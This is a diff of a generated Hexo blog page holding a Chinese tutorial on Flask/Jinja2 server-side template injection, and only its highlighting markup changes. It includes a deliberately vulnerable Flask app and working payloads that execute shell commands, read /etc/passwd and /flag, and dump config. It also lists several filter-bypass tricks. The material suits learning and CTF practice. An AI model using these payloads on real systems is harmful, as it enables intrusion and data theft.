@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -267,11 +267,11 @@
 <p>用于返回对象所属的类</p>
 <div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
 <span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__
-&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">str</span>&#x27;&gt;</span>
-<span class="hljs-class">&gt;&gt;&gt; ().<span class="hljs-title">__class__</span></span>
-<span class="hljs-class">&lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">tuple</span>&#x27;&gt;</span>
-<span class="hljs-class">&gt;&gt;&gt; [].<span class="hljs-title">__class__</span></span>
-<span class="hljs-class">&lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">list</span>&#x27;&gt;</span></code></pre></div>
+&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;
+<span class="hljs-meta">&gt;&gt;&gt; </span>().__class__
+&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;
+<span class="hljs-meta">&gt;&gt;&gt; </span>[].__class__
+&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;</code></pre></div>
 
 <ul>
 <li><code>__base__</code></li>
@@ -298,7 +298,7 @@
 app = Flask(__name__)
 
 <span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span>
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
     name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)
     template = <span class="hljs-string">&#x27;&#x27;&#x27;</span>
 <span class="hljs-string">&lt;html&gt;</span>
@@ -319,7 +319,7 @@ app = Flask(__name__)
 
 <p>提交参数<code>name=&#123;&#123;2-1&#125;&#125;</code>，会显示1，这也是测试ssti的一种常用的方法</p>
 <p>下图是常用的测试方法和对应的模板类型</p>
-<p><img src="https://i.loli.net/2020/11/30/LAJfgePG7qsKph4.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/LAJfgePG7qsKph4.png" srcset="/img/loading.gif"></p>
 <h1 id="0x2-构造链思路"><a href="#0x2-构造链思路" class="headerlink" title="0x2 构造链思路"></a>0x2 构造链思路</h1><p>这里从零开始介绍如何去构造SSTI漏洞的payload，可以用上面存在SSTI漏洞的<code>ssti.py</code>做实验</p>
 <ul>
 <li>第一步</li>
@@ -328,16 +328,16 @@ app = Flask(__name__)
 <p>可以通过使用<code>str</code>，<code>list</code>，<code>tuple</code>，<code>dict</code>等来获取</p>
 <div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
 <span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__
-&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">str</span>&#x27;&gt;</span>
-<span class="hljs-class">&gt;&gt;&gt; &quot;&quot;.<span class="hljs-title">__class__</span></span>
-<span class="hljs-class">&lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">str</span>&#x27;&gt;</span>
-<span class="hljs-class">&gt;&gt;&gt; [].<span class="hljs-title">__class__</span></span>
-<span class="hljs-class">&lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">list</span>&#x27;&gt;</span>
-<span class="hljs-class">&gt;&gt;&gt; ().<span class="hljs-title">__class__</span></span>
-<span class="hljs-class">&lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">tuple</span>&#x27;&gt;</span>
-&gt;&gt;&gt; &#123;&#125;.__class__
-&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">dict</span>&#x27;&gt;</span>
-<span class="hljs-class"></span></code></pre></div>
+&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;
+<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&quot;&quot;</span>.__class__
+&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;
+<span class="hljs-meta">&gt;&gt;&gt; </span>[].__class__
+&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;
+<span class="hljs-meta">&gt;&gt;&gt; </span>().__class__
+&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;
+<span class="hljs-meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__
+&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;
+</code></pre></div>
 
 <ul>
 <li>第二步</li>
@@ -346,19 +346,19 @@ app = Flask(__name__)
 <p>用<code>__bases__[0]</code>拿到基类</p>
 <div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
 <span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__bases__[<span class="hljs-number">0</span>]
-&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">object</span>&#x27;&gt;</span></code></pre></div>
+&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;</code></pre></div>
 
 <p>用<code>__base__</code>拿到基类</p>
 <div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
 <span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__
-&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">object</span>&#x27;&gt;</span></code></pre></div>
+&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;</code></pre></div>
 
 <p>用<code>__mro__[1]</code>或者<code>__mro__[-1]</code>拿到基类</p>
 <div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
 <span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">1</span>]
-&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">object</span>&#x27;&gt;</span>
-<span class="hljs-class">&gt;&gt;&gt; &#x27;&#x27;.<span class="hljs-title">__class__</span>.<span class="hljs-title">__mro__</span>[-1]</span>
-<span class="hljs-class">&lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">object</span>&#x27;&gt;</span></code></pre></div>
+&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;
+<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>]
+&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;</code></pre></div>
 
 <ul>
 <li>第三步</li>
@@ -382,37 +382,37 @@ app = Flask(__name__)
 <h2 id="命令执行构造"><a href="#命令执行构造" class="headerlink" title="命令执行构造"></a>命令执行构造</h2><p>在双大括号我们可以执行表达式,但是命名空间是受限的,没有builtins,所以eval,open这些操作是不能使用的,但根据前面的知识,我们可以通过任意一个函数的func_globals而得到他们的命名空间,而得到builtins</p>
 <h2 id="flask内置函数"><a href="#flask内置函数" class="headerlink" title="flask内置函数"></a>flask内置函数</h2><p>这种方法之前好像没人提过</p>
 <p>Flask 内置了两个函数url_for 和 get_flashed_messages,还有一些内置的对象</p>
-<div class="hljs"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;__builtins__&#x27;].__import__(<span class="hljs-name">&#x27;os&#x27;</span>).system(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;&#125;</span>
-<span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;__builtins__&#x27;].__import__(<span class="hljs-name">&#x27;os&#x27;</span>).system(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span>
+<span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span></code></pre></div>
 
 <p>如果过滤了config,又需要查config</p>
-<div class="hljs"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span>
-<span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><span class="language-xml"></span>
+<span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span></code></pre></div>
 
 <h2 id="通过基类查找子类"><a href="#通过基类查找子类" class="headerlink" title="通过基类查找子类"></a>通过基类查找子类</h2><p>虽然模块间的变量不共享,但是所有类都是object的子类,所以可以通过object类而得到其他类</p>
 <p>利用</p>
-<div class="hljs"><pre><code class="hljs reasonml">#python2.<span class="hljs-number">7</span>
-&#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">2</span>]
-&#123;&#125;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
-<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
-<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
-request.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]
-#python3.<span class="hljs-number">7</span>
-&#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]
-&#123;&#125;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
-<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
-<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>]
-<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span></span></span>
-<span class="hljs-module-access"><span class="hljs-module">(</span></span>).<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span></span></span>
-<span class="hljs-module-access"><span class="hljs-module">&#123;</span></span>&#125;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span></span></span>
-<span class="hljs-module-access"><span class="hljs-module">r</span></span>equest.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]
-session.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]
-redirect.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">1</span>]</code></pre></div>
+<div class="hljs"><pre><code class="hljs markdown"><span class="hljs-section">#python2.7</span>
+&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[2]
+&#123;&#125;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]
+().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]
+[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]
+request.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1]
+<span class="hljs-section">#python3.7</span>
+&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1]
+&#123;&#125;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]
+().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]
+[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]
+[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>
+().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>
+&#123;&#125;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>
+request.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1]
+session.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1]
+redirect.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1]</code></pre></div>
 
 <p>等得到object 对象,然后通过<code>__subclasses__()</code>方法,得到所有子类,在找重载过<code>__inti__,__repr__</code>等特殊方法的类,利用这些方法的<code>__globals__</code>得到,<code>__builtins__</code>,或者<code>os,codecs</code>等可以进行代码执行的调用.</p>
 <p>常见payload</p>
-<div class="hljs"><pre><code class="hljs reasonml"><span class="hljs-comment">// 59 为warnings.WarningMessag</span>
-&#x27;&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span><span class="hljs-number">2</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">59</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>[</span></span>&#x27;__builtins__&#x27;]<span class="hljs-literal">[&#x27;<span class="hljs-identifier">eval</span>&#x27;]</span>(&#x27;<span class="hljs-constructor">__import__(<span class="hljs-string">&quot;os&quot;</span>)</span>.popen(<span class="hljs-string">&quot;ls&quot;</span>).read<span class="hljs-literal">()</span>&#x27;)</code></pre></div>
+<div class="hljs"><pre><code class="hljs sqf"><span class="hljs-comment">// 59 为warnings.WarningMessag</span>
+<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)</code></pre></div>
 
 <p>不使用globals的payload</p>
 <div class="hljs"><pre><code class="hljs prolog">// &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;类在在内部定义了<span class="hljs-symbol">_module</span>=sys.modules[<span class="hljs-string">&#x27;warnings&#x27;</span>]，然后warnings模块包含有<span class="hljs-symbol">__builtins__</span>,
@@ -431,29 +431,27 @@ redirect.<span class="hljs-module-access"><span class="hljs-module"><span class=
 <li><p>Jinja2 的attr 过滤器可以获得对象的属性或方法</p>
 </li>
 <li><p>flask内置的request对象可以得到请求的信息</p>
-<div class="hljs"><pre><code class="hljs stylus">request<span class="hljs-selector-class">.args</span>.name
-request<span class="hljs-selector-class">.cookies</span>.name
-request<span class="hljs-selector-class">.headers</span>.name
-request<span class="hljs-selector-class">.values</span>.name
-request<span class="hljs-selector-class">.form</span>.name</code></pre></div>
-
-</li>
+<div class="hljs"><pre><code class="hljs stylus">request<span class="hljs-selector-class">.args</span><span class="hljs-selector-class">.name</span>
+request<span class="hljs-selector-class">.cookies</span><span class="hljs-selector-class">.name</span>
+request<span class="hljs-selector-class">.headers</span><span class="hljs-selector-class">.name</span>
+request<span class="hljs-selector-class">.values</span><span class="hljs-selector-class">.name</span>
+request<span class="hljs-selector-class">.form</span>.name</code></pre></div></li>
 </ul>
 <h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><h3 id="没过滤引号"><a href="#没过滤引号" class="headerlink" title="没过滤引号"></a>没过滤引号</h3><ul>
 <li>如果没用过滤引号,使用反转,或者各种拼接绕过</li>
 </ul>
-<div class="hljs"><pre><code class="hljs clojure">&#123;&#123;&#x27;&#x27;.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[&#x27;__snitliub__&#x27;[<span class="hljs-symbol">::-1</span>]][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;ls&quot;</span>).read()&#x27;)&#125;&#125;
-
-&#123;&#123;&#x27;&#x27;.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[&#x27;__buil&#x27;+&#x27;tins__&#x27;[<span class="hljs-symbol">::-1</span>]][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;ls&quot;</span>).read()&#x27;)&#125;&#125;</code></pre></div>
+<div class="hljs"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[1].__subclasses__()[59].__init__.__globals__[&#x27;__snitliub__&#x27;[::-1]][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span>
+<span class="language-xml"></span>
+<span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[1].__subclasses__()[59].__init__.__globals__[&#x27;__buil&#x27;+&#x27;tins__&#x27;[::-1]][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>)&#125;&#125;</span></code></pre></div>
 
 <h3 id="过滤了引号"><a href="#过滤了引号" class="headerlink" title="过滤了引号"></a>过滤了引号</h3><ul>
 <li>利用将需要的变量放在请求中,然后通过[],或者通过<code>attr</code>,<code>__getattribute__</code>获得</li>
 </ul>
-<div class="hljs"><pre><code class="hljs handlebars"><span class="xml">// url?a=eval</span>
-<span class="xml">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.[request.args.a](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)</span>
-
-<span class="xml">// Cookie: aa=__class__;bb=__mro__;cc=__subclasses__</span>
-<span class="hljs-template-variable">&#123;&#123;((<span class="hljs-name">request</span>|attr(<span class="hljs-name">request.cookies.get</span>(<span class="hljs-name">&#x27;aa&#x27;</span>))|attr(<span class="hljs-name">request.cookies.get</span>(<span class="hljs-name">&#x27;bb&#x27;</span>))|list).pop(<span class="hljs-name">-1</span>))|attr(<span class="hljs-name">request.cookies.get</span>(<span class="hljs-name">&#x27;cc&#x27;</span>))()&#125;&#125;</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs handlebars"><span class="language-xml">// url?a=eval</span>
+<span class="language-xml">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.[request.args.a](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)</span>
+<span class="language-xml"></span>
+<span class="language-xml">// Cookie: aa=__class__;bb=__mro__;cc=__subclasses__</span>
+<span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;((<span class="hljs-name">request</span>|attr(<span class="hljs-name">request.cookies.get</span>(<span class="hljs-name">&#x27;aa&#x27;</span>))|attr(<span class="hljs-name">request.cookies.get</span>(<span class="hljs-name">&#x27;bb&#x27;</span>))|list).pop(<span class="hljs-name">-1</span>))|attr(<span class="hljs-name">request.cookies.get</span>(<span class="hljs-name">&#x27;cc&#x27;</span>))()&#125;&#125;</span></code></pre></div>
 
 <ul>
 <li><p>如果request被ban,可以考虑通过</p>
@@ -464,30 +462,30 @@ request<span class="hljs-selector-class">.form</span>.name</code></pre></div>
 <li><p>查出chr函数,利用set赋值,然后使用</p>
 </li>
 </ul>
-<div class="hljs"><pre><code class="hljs handlebars"><span class="xml">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><span class="hljs-template-variable">&#123;&#123; ()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">40</span>)(<span class="hljs-name">chr</span>(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">119</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">100</span>)).read() &#125;&#125;</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs handlebars"><span class="language-xml">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><span class="hljs-template-variable">&#123;&#123; ()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">40</span>)(<span class="hljs-name">chr</span>(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">119</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">100</span>)).read() &#125;&#125;</span></code></pre></div>
 
 <ul>
 <li>利用内置过滤器拼接出,’%c’,再利用’’%语法得到任意字符</li>
 </ul>
-<div class="hljs"><pre><code class="hljs twig"><span class="xml">get %</span>
-<span class="xml">找到特殊字符&lt;,url编码,得到%</span>
-<span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> pc = g|<span class="hljs-keyword">lower</span>|list|<span class="hljs-keyword">first</span>|urlencode|<span class="hljs-keyword">first</span>%&#125;</span>
+<div class="hljs"><pre><code class="hljs twig"><span class="language-xml">get %</span>
+<span class="language-xml">找到特殊字符&lt;,url编码,得到%</span>
+<span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> pc = g<span class="hljs-punctuation">|</span><span class="hljs-keyword">lower</span><span class="hljs-punctuation">|</span>list<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span>urlencode<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span>
+<span class="language-xml"></span>
+<span class="language-xml"></span>
+<span class="language-xml">get &#x27;c&#x27;</span>
+<span class="language-xml"></span>
+<span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> c=dict(c=<span class="hljs-number">1</span>).keys()<span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span>
+<span class="language-xml"></span>
+<span class="language-xml">字符串拼接</span>
+<span class="language-xml"></span>
+<span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> udl=dict(a=pc,c=c).values()<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span>
+<span class="language-xml"></span>
+<span class="language-xml">可以得到任意字符了</span>
+<span class="language-xml"></span>
+<span class="language-xml">get _</span>
+<span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> udl<span class="hljs-number">2</span>=udl%(<span class="hljs-number">95</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;udl&#125;&#125;</span></code></pre></div>
 
-
-<span class="xml">get &#x27;c&#x27;</span>
-
-<span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=dict(c=1).keys()|<span class="hljs-keyword">reverse</span>|<span class="hljs-keyword">first</span>%&#125;</span>
-
-<span class="xml">字符串拼接</span>
-
-<span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> udl=dict(a=pc,c=c).values()|<span class="hljs-keyword">join</span> %&#125;</span>
-
-<span class="xml">可以得到任意字符了</span>
-
-<span class="xml">get _</span>
-<span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> udl2=udl%(95)%&#125;</span><span class="hljs-template-variable">&#123;&#123;udl&#125;&#125;</span></code></pre></div>
-
-<h3 id="特殊字符过滤"><a href="#特殊字符过滤" class="headerlink" title="特殊字符过滤"></a>特殊字符过滤</h3><p>其他奇奇怪怪的过滤,善用Flask/Jinja2的文档,用内置过滤器,函数,变量,魔术方法等绕过</p>
+<h3 id="特殊字符过滤"><a href="#特殊字符过滤" class="headerlink" title="特殊字符过滤"></a>特殊字符过滤</h3><p>其他奇奇怪怪的过滤,善用Flask&#x2F;Jinja2的文档,用内置过滤器,函数,变量,魔术方法等绕过</p>
 <p>如果是替换为空，可以尝试双写绕过，或者使用黑名单逻辑漏洞错误绕过，即使用黑名单最后一个关键字替换绕过</p>
 <p>如果直接ban了，就可以使用字符串拼接的方式等方法进行绕过，常用方法如下</p>
 <ul>
@@ -532,14 +530,14 @@ request<span class="hljs-selector-class">.form</span>.name</code></pre></div>
 
 
 <h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤 ["></a>过滤 [</h3><p>可以使用<code>__getitem__</code>和<code>pop</code>替代中括号，取列表的第n位</p>
-<div class="hljs"><pre><code class="hljs sqf"><span class="hljs-meta">#getitem、pop</span>
-<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()
-<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">59</span>).<span class="hljs-variable">__init__</span>.func_globals.linecache.os.popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()
